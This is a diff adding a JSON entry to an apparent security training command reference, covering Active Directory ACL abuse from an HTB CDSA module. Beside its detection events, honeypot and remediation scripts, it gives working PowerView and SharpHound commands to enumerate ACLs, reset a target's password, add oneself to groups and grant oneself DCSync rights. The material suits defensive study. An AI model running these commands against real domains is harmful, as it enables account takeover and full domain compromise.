@@ -1,0 +1,103 @@
+{
+  "id": "cdsa-m06-object-acls",
+  "name": "Object ACL Abuse in Active Directory \u2014 BloodHound & Detection",
+  "command": ".\\SharpHound.exe -c All --zipfilename bh_output",
+  "description": "AD object ACLs (Access Control Lists) control who can modify objects \u2014 users, groups, computers, GPOs. Common misconfigurations: WriteDACL, WriteOwner, GenericWrite, GenericAll on privileged objects. Attackers enumerate via BloodHound/SharpHound and exploit to reset passwords, add group members, or gain DCSync rights. Detection: Events 4738/4742/4724 for object changes, 4662 for ACL modifications.",
+  "platform": "windows",
+  "type": "attack-chain",
+  "opsec": "moderate",
+  "category": "Active Directory Defense",
+  "subcategory": "ACL Abuse",
+  "certifications": [
+    "CDSA"
+  ],
+  "source": "CDSA Module 06: Windows Attacks & Defense",
+  "tags": [
+    "acl",
+    "bloodhound",
+    "sharphound",
+    "dacl",
+    "adaclscanner",
+    "event-4738",
+    "active-directory",
+    "blue-team"
+  ],
+  "mitre": [
+    "T1222.001",
+    "T1078.002",
+    "T1484.001"
+  ],
+  "notes": "=== BACKGROUND ===\n  Every AD object has a DACL (Discretionary ACL) controlling access\n  Dangerous rights on privileged objects:\n    GenericAll    \u2192 full control (reset password, modify membership, etc.)\n    GenericWrite  \u2192 write any non-protected property\n    WriteOwner    \u2192 change object ownership (owner gets WriteDACL)\n    WriteDACL     \u2192 modify the ACL itself (add yourself as owner/GenericAll)\n    ForceChangePassword \u2192 reset password without knowing current\n    AddMember     \u2192 add users to groups\n    AllExtendedRights \u2192 grants all extended rights (password reset, etc.)\n\n  Typical attack path BloodHound finds:\n    LowPrivUser \u2192 GenericAll \u2192 DA Group \u2192 Domain Admins\n    Svc_Account \u2192 WriteDACL \u2192 Domain Object \u2192 grant self DCSync rights\n\n=== ATTACK: Collection ===\n# Run SharpHound on domain-joined machine (any domain user)\n.\\SharpHound.exe -c All --zipfilename bh_output\n  \u2192 -c All: all collection methods (ACL, ObjectProps, Trusts, etc.)\n  \u2192 Creates zip archive with JSON files\n\n# Import into BloodHound\n# 1. Start BloodHound (GUI)\n# 2. Upload data: Drag zip file to BloodHound or use 'Import Data'\n# 3. Shortest Paths to Domain Admins \u2192 reveals ACL abuse chains\n\n# Alternative: ADACLScanner (PowerShell)\n. .\\ADACLScanner.ps1\nCreate-ACLReport -Base 'DC=<DOMAIN>,DC=<TLD>' -RecurseLevel 5\n  \u2192 Generates HTML report of all non-standard ACEs\n\n=== ATTACK: Exploitation (generic) ===\n# If attacker has GenericAll on a user \u2014 reset password\nSet-DomainUserPassword -Identity <TARGET_USER> -AccountPassword (ConvertTo-SecureString \"<NEW_PASS>\" -AsPlainText -Force)\n\n# If attacker has GenericAll on a group \u2014 add self\nAdd-DomainGroupMember -Identity \"<GROUP_NAME>\" -Members \"<YOUR_USER>\"\n\n# If attacker has WriteDACL on domain object \u2014 grant DCSync rights\nAdd-DomainObjectAcl -TargetIdentity <DOMAIN> -PrincipalIdentity <YOUR_USER> -Rights DCSync\n\n=== DETECTION ===\nEvent 4738: 'A user account was changed'\n  \u2192 Logged when any user account attribute is modified (password, flags, groups, etc.)\n  \u2192 Does NOT show what specifically changed\n  \u2192 Alert: privileged account modified by non-admin\n\nEvent 4742: 'A computer account was changed'\n  \u2192 Same as 4738 but for computer objects\n\nEvent 4724: 'An attempt was made to reset an account's password'\n  \u2192 Logged when someone resets another account's password\n  \u2192 Admin resetting SA or vice-versa = suspicious\n\nEvent 4662: 'An operation was performed on an object'\n  \u2192 Logged when object ACL is modified (if SACL auditing enabled)\n  \u2192 Filter for DACL modification GUIDs\n\nHoneypot ACL:\n  \u2192 Create a user with GenericAll on another dummy object\n  \u2192 Alert on any 4738/4724 for honeypot user objects\n  \u2192 Any modification = attacker followed BloodHound path\n\n=== PREVENTION ===\n  \u2192 Run ADACLScanner quarterly, alert on new non-standard ACEs\n  \u2192 Tier model: never grant admin rights at lower tiers\n  \u2192 Protected Users group prevents delegation/use of NTLM for privileged accounts\n  \u2192 Enable 'Audit Directory Service Access' (Success + Failure)",
+  "examples": [
+    {
+      "label": "Run SharpHound \u2014 collect all AD data",
+      "command": ".\\SharpHound.exe -c All --zipfilename bh_output"
+    },
+    {
+      "label": "Find all ACEs with dangerous rights (PowerView)",
+      "command": "Get-DomainObjectAcl -ResolveGUIDs -IdentityFilter * | Where-Object { $_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteDACL|WriteOwner|ForceChangePassword' }"
+    },
+    {
+      "label": "Abuse GenericAll \u2014 reset user password",
+      "command": "Set-DomainUserPassword -Identity <TARGET_USER> -AccountPassword (ConvertTo-SecureString '<NEW_PASS>' -AsPlainText -Force)"
+    },
+    {
+      "label": "Abuse GenericAll on group \u2014 add self as member",
+      "command": "Add-DomainGroupMember -Identity '<GROUP_NAME>' -Members '<YOUR_USER>'"
+    },
+    {
+      "label": "Grant DCSync rights via WriteDACL on domain object",
+      "command": "Add-DomainObjectAcl -TargetIdentity <DOMAIN> -PrincipalIdentity <YOUR_USER> -Rights DCSync"
+    },
+    {
+      "label": "Monitor Event 4738 \u2014 user account changed",
+      "command": "Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4738} | Select -First 20 | Format-List"
+    },
+    {
+      "label": "Monitor Event 4724 \u2014 password reset attempt",
+      "command": "Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4724} | Select -First 10 | Format-List"
+    }
+  ],
+  "references": [
+    {
+      "title": "HTB Academy - Windows Attacks & Defense",
+      "url": "https://academy.hackthebox.com/module/details/176"
+    },
+    {
+      "title": "GitHub - ADACLScanner",
+      "url": "https://github.com/canix1/ADACLScanner"
+    },
+    {
+      "title": "BloodHound Documentation",
+      "url": "https://bloodhound.readthedocs.io/en/latest/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "cdsa-m06-dcsync",
+      "rel": "next",
+      "note": "ACL WriteDACL on domain object can grant DCSync rights \u2014 next step."
+    },
+    {
+      "id": "cdsa-m06-gpo-permissions",
+      "rel": "next",
+      "note": "GPO ACL abuse \u2014 specific ACL misconfiguration for Group Policy objects."
+    }
+  ],
+  "defense": {
+    "why_it_works": "Every AD object has a DACL. Excessive rights (GenericAll, GenericWrite, WriteDACL, WriteOwner, ForceChangePassword, AddMember, AllExtendedRights) on privileged objects let an attacker reset passwords, add group members, or grant themselves DCSync \u2014 turning a low-priv foothold into domain admin along a BloodHound path.",
+    "prerequisites": "Control of a principal that holds a dangerous ACE over a more-privileged object (found via BloodHound/SharpHound or ADACLScanner).",
+    "impact": "Privilege escalation along the ACL chain \u2014 password resets, group membership changes, or self-granted DCSync rights leading to domain compromise.",
+    "detection": "Event 4738/4742 (user/computer account changed), 4724 (password reset attempt), and 4662 (operation on an object, for DACL modifications with SACL auditing enabled). Alert when a privileged account is modified by a non-admin, or a honeypot object with a dangling ACE is touched.",
+    "artifacts": "4738/4742/4724/4662 events tied to non-admin principals; SharpHound collection zip on the attacker host; PowerView Add-DomainObjectAcl / Set-DomainUserPassword execution.",
+    "prevention": "Run ADACLScanner quarterly and alert on new non-standard ACEs; enforce an AD tier model (no admin rights at lower tiers); add privileged accounts to Protected Users; enable 'Audit Directory Service Access' (Success + Failure).",
+    "sources": [
+      "HTB CDSA M06",
+      "MITRE T1222.001",
+      "MITRE T1078.002"
+    ],
+    "misconfiguration": "AD objects (users, groups, OUs, GPOs) have overly permissive ACEs granting non-privileged users GenericAll, GenericWrite, WriteDACL, WriteOwner, or ExtendedRight (ForceChangePassword, AddMember). Because AD ACEs are not prominently visible in standard tools and can be inherited from parent OUs, these misconfigurations accumulate over time \u2014 especially after large provisioning events or mergers.",
+    "vulnerable_config": "# Finding objects where Domain Users have dangerous rights:\nGet-DomainObjectAcl -ResolveGUIDs |\n    Where-Object {\n        $_.IdentityReference -eq 'CORP\\Domain Users' -and\n        $_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteDACL|WriteOwner'\n    }\n\n# Or via BloodHound:\n# 'Shortest Paths to Domain Admins from Domain Users' query\n# Shows every ACE path from low-privilege to DA",
+    "secure_config": "# Remove dangerous ACEs using PowerView:\nRemove-DomainObjectAcl -TargetIdentity 'Domain Admins' \\\n    -PrincipalIdentity 'Domain Users' -Rights GenericWrite\n\n# Quarterly ACL audit script:\nGet-DomainObjectAcl -ResolveGUIDs | Where-Object {\n    $_.ActiveDirectoryRights -match 'GenericAll|WriteDACL|WriteOwner' -and\n    $_.IdentityReference -notmatch 'Domain Admins|Enterprise Admins|SYSTEM'\n} | Export-Csv acl_audit_$(Get-Date -f yyyyMMdd).csv\n\n# Enable AD Recycle Bin and Protected Users group\n# Use Tiered Administration model to limit blast radius of any single compromise\n# Enable MDI (Microsoft Defender for Identity) \u2014 detects ACL abuse chains"
+  }
+}
